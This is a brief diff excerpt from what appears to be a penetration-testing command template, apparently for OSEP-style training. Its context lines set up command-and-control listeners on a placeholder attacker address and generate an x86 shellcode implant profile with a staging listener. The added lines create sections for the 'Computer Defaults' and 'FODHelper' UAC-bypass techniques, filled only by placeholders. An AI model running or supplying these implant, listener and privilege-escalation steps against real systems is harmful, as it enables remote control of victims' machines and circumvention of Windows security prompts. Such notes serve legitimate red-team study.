@@ -36,3 +36,21 @@ http -L {ATTACKER_IP} --lport 81
 profiles new --http {ATTACKER_IP}:83 --format shellcode -a x86 osep86
 stage-listener --url tcp://{ATTACKER_IP}:84 --profile osep86
 http -L {ATTACKER_IP} --lport 83
+
+
+
+#UAC Computer Defaults
+
+{UAC_COMPUTER_DEFAULTS}
+
+
+
+#UAC FODHelper
+
+{UAC_FODHELPER}
+
+
+
+
+
+
